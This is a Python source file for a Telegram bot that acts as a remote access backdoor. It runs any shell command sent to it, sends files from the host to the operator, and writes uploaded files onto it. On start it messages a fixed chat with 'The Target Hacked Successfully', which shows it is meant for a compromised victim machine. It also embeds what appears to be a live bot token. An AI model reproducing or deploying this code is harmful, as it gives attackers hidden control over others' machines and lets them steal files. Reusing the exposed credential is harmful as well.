import telebot
from telebot.types import Message
import subprocess,os

# Replace with your actual bot token
API_TOKEN = '6755888178:AAEphrCIMMFwKpEHFUnDAJWgfN4TgGlODXw'
bot = telebot.TeleBot(API_TOKEN)

# Replace with your Telegram user ID for security (to restrict access to only you)


@bot.message_handler(commands=['start'])
def send_welcome(message):

    bot.reply_to(message, "Welcome! Send any command to execute it on the server.")

@bot.message_handler(commands=['help'])
def send_welcome(message):

    commands=[
        "/start ==>> Start the bot",
        "/download filename ==>> recv files",
    ]
    for command in commands:
        bot.reply_to(message, f"```{command}```", parse_mode="Markdown")



@bot.message_handler(commands=['download'])
def send_file(message:Message):

    # Extract the file path from the message
    try:
        command_parts = message.text.split(maxsplit=1)
        if len(command_parts) < 2:
            bot.reply_to(message, "Usage: /recvfile <path_to_file>")
            return

        file_path = os.path.join(os.getcwd(),command_parts[1].strip())

        # Check if the file exists
        if not os.path.isfile(file_path):
            bot.reply_to(message, f"```File not found: {file_path}```", parse_mode="Markdown")
            return

        # Send the file
        bot.reply_to(message,"Downloading the document please wait ....")
        with open(file_path, 'rb') as file:
            bot.send_document(message.chat.id, file)
            bot.reply_to(message, f"```File '{os.path.basename(file_path)}' sent successfully.```", parse_mode="Markdown")

    except Exception as e:
        bot.reply_to(message, f"```Error sending file: {e}```", parse_mode="Markdown")


@bot.message_handler(content_types=['document'])
def handle_document(message:Message):


    try:
        # Get the file ID and file info
        file_id = message.document.file_id
        file_info = bot.get_file(file_id)
        
        # Download the file
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Create the file path to save the file
        file_name = message.document.file_name
        file_path = os.path.join(os.getcwd(), file_name)
        
        # Save the file
        bot.reply_to(message,"Uploading the document please wait ....")
        with open(file_path, 'wb') as new_file:
            new_file.write(downloaded_file)
        
        bot.reply_to(message, f"```File '{file_name}' uploaded successfully!```", parse_mode="Markdown")

    except Exception as e:
        bot.reply_to(message, f"Failed to upload file: {e}")

@bot.message_handler(func=lambda message: True)
def execute_command(message:Message):
    command = message.text.strip()

    if not command:
        bot.reply_to(message, "Please provide a command.")

    elif command=="pwd":
        bot.reply_to(message, f"```\n{os.getcwd()}\n```", parse_mode="Markdown")

    
    elif command.startswith("cd"):

        parts = command.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(message, "```Usage: `cd <directory>````", parse_mode="Markdown")
            return

        new_dir = parts[1]
        try:
            # Change directory and update the user's current directory
            new_path = os.path.abspath(os.path.join(os.getcwd(), new_dir))
            os.chdir(new_path)

            bot.reply_to(message, f"```Changed directory to: {new_path}```", parse_mode="Markdown")
        except FileNotFoundError:
            bot.reply_to(message, f"```No such directory: {new_dir}```", parse_mode="Markdown")
        except NotADirectoryError:
            bot.reply_to(message, f"```Not a directory: {new_dir}```", parse_mode="Markdown")
        except PermissionError:
            bot.reply_to(message, f"```Permission denied: {new_dir}```", parse_mode="Markdown")
        
        except OSError:
            bot.reply_to(message, f"```The filename, directory name, or volume label syntax is incorrect: '{os.getcwd()}' \n```", parse_mode="Markdown")
        
    
    else:
        try:
            # Execute the command and capture the output
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            if not result.strip():
                result = "Command executed successfully with no output."
        except subprocess.CalledProcessError as e:
            result = f"Error: {e.output}"

        # Send the output back to the user
        bot.reply_to(message, f"```\n{result}\n```", parse_mode="Markdown")

bot.send_message(923480874,"The Target Hacked Successfully")

bot.infinity_polling()
